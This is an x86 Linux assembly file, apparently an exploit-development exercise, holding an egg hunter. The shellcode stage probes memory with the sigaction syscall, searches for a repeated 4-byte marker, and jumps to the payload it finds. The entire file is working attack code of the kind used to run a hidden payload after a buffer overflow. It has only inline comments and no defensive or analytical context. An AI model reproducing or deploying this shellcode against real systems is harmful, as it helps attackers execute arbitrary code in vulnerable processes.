;Author: Will Summerhill
;Egg hunter code 

global _start

section .text
_start:

entry:
	or cx, 0xfff
next:
	inc ecx 			      ;page counter
	push byte +0x43		  ;sigaction system call
	pop eax 			      ;store sigaction syscall into EAX
	int 0x80			      ;execute sigaction
	cmp al, 0xf2		    ;check if there was a segFault (if AL = 0xf2)
	jz entry			      ;jump if zero flag (ZF) set from above cmp
	mov eax, 0x99999999	;store egg into EAX
	mov edi, ecx 		    ;move into EDI to validate address
	
	;EAX is egg, EDI is next address to validate
	scasd				        ;scan string by comparing EAX and EDI, increment EDI by 4 
	jnz next			      ;jump if zero flag (ZF) is not set from above compare
	
	scasd				        ;will execute when first bytes of egg matched, compare the second half
	jnz next			      ;match failed - try again from next address
	jmp edi 			      ;egg found - jump to payload in EDI
